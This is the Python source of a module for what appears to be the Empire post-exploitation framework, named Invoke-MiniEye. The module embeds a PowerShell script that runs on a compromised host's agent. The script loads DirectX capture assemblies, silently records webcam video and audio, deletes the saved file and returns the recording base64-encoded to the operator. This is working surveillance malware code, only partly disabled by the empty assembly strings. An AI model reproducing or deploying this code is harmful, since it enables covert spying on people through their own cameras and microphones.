from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Invoke-MiniEye',

            # list of one or more authors for the module
            'Author': ['@xorrior'],

            # more verbose multi-line description of the module
            'Description': ('This module uses the DirectX.Capture and DShowNET .NET assemblies to capture video from a webcam.'),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "avi",

            # True if the module needs admin rights to run
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,
            
            # The minimum PowerShell version needed for the module to run
            'MinPSVersion' : '2',

            # list of any references/other comments
            'Comments': [
                'comment',
                'https://github.com/xorrior/RandomPS-Scripts/blob/master/MiniEye.ps1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to run the module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'RecordTime' : {
                'Description'   :   'Length of time to record in seconds',
                'Required'      :   True,
                'Value'         :   '5'
            },
            'FilePath' : {
                'Description'   :   'Temporary save path for the .avi file. Saved to the current users APPDATA\\roaming directory if not specified',
                'Required'      :   False,
                'Value'         :   ''
            },
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self):
        
        # the PowerShell script itself, with the command to invoke
        #   for execution appended to the end. Scripts should output
        #   everything to the pipeline for proper parsing.
        #
        # the script should be stripped of comments, with a link to any
        #   original reference script included in the comments.
        script = """
function Invoke-MiniEye {
    [CmdletBinding()]
    param
    (
        [Parameter(Mandatory=$False, ParameterSetName = 'Video')]
        [Alias("T")]
        [ValidateRange(1,999999)]
        [Int]$RecordTime = 5,

        [Parameter(Mandatory = $False, ParameterSetName = 'Image')]
        [switch]$Image,

        [Parameter(Mandatory = $False)]
        [Alias("Path")]
        [string]$FilePath
    )

    #Get the assemblies ready
    #http://www.codeproject.com/Articles/3566/DirectX-Capture-Class-Library
    #http://directshownet.sourceforge.net/
    $DirectXCaptureDll = ""
    $DShowDll = ""
    $DShowContent = [System.Convert]::FromBase64String($DShowDll)
    $DirectXContent = [System.Convert]::FromBase64String($DirectXCaptureDll)

    Try{[System.Reflection.Assembly]::Load($DShowContent) | Out-Null}
    catch{Throw "Unable to load DirectShow Assembly"}

    Try{[System.Reflection.Assembly]::Load($DirectXContent) | Out-Null}
    catch{Throw "Unable to load DirectX Assembly"}

    if($PSCmdlet.ParameterSetName -eq "Video")
    {
        Write-Verbose "[+]Enumerating Video And Audio Devices"
        $filters = New-Object DirectX.Capture.filters
        if(($filters.VideoInputDevices -ne $null) -and ($filters.AudioInputDevices -ne $null))
        {
            $VideoInput = $filters.VideoInputDevices[0]
            $AudioInput = $filters.AudioInputDevices[0]

            $VideoCapture = New-Object DirectX.Capture.Capture -ArgumentList $VideoInput,$AudioInput
            $compression = $filters.VideoCompressors[0]
            if($compression -ne $null)
            {
                $VideoCapture.VideoCompressor = $compression
            }

            if($PSBoundParameters['FilePath'])
            {
                $VideoCapture.FileName = $FilePath
            }
            else
            {
                $FilePath = "$($env:APPDATA)\out.avi"
                $VideoCapture.FileName = $FilePath
            }

            try{$VideoCapture.Start()}
            catch{Write-Verbose "[!]Unable to start capture";$VideoCapture.Stop()}

            Start-Sleep -Seconds $RecordTime

            $VideoCapture.Stop()

            $fileContents = [System.IO.File]::ReadAllBytes($FilePath)
            Remove-Item $FilePath
            [System.Convert]::ToBase64String($fileContents)
        }
    }
    elseif($PSBoundParameters['Image'])
    {
        Write-Verbose "[!]Work in progress...."
    }
}
Invoke-MiniEye"""


        # if you're reading in a large, external script that might be updates,
        #   use the pattern below
        # read in the common module source code


        # add any arguments to the end execution of the script
        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " " + str(values['Value'])

        return script
